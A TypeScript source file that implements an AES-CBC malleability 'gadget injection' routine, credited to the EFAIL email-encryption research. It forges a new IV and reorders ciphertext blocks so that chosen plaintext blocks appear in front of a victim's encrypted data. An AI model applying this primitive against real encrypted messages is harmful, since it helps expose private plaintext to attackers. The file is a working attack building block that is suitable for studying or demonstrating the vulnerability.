import {Buffer} from 'node:buffer'

const xor = (buf1: Buffer, buf2: Buffer): Buffer => Buffer.from(buf1.map((b, i) => b ^ buf2[i]))

/**
 * Function to inject gadget0 and gadget1 instead of the first block.
 * Heavily based out of https://efail.de/
 * @param encryptedData the encrypted data with AES-CBC
 * @param p0 the plaintext value of the first block of the message
 * @param gadget0 The plaintext value of the first block to inject which will replace p0
 * @param gadget1 The plaintext value of the second block to inject which will be placed before the second block of the message
 */
export const injectGadget = (encryptedData: Buffer, p0: Buffer, gadget0: Buffer, gadget1: Buffer): Buffer => {
    const iv: Buffer = encryptedData.subarray(0, 16)
    const c0: Buffer = encryptedData.subarray(16, 32) // contains p0 (known), encrypted
    const c1: Buffer = encryptedData.subarray(32) // contains the rest, therefore p1 (unknown), encrypted

    const x: Buffer = xor(iv, p0) // canonical plaintext (all 0 if decrypted)

    const x0: Buffer = xor(x, gadget0)
    const x1: Buffer = xor(x, gadget1)

    return Buffer.concat([
        x0, // forged IV
        c0, // forged 1st block which will be decrypted into gadget0
        x1, // forged block with garbage, allows to link with next block
        c0, // forged 3rd block which will be decrypted into gadget1
        c1  // actual 2nd block placed as 4th block which contain the targeted data
    ])
}
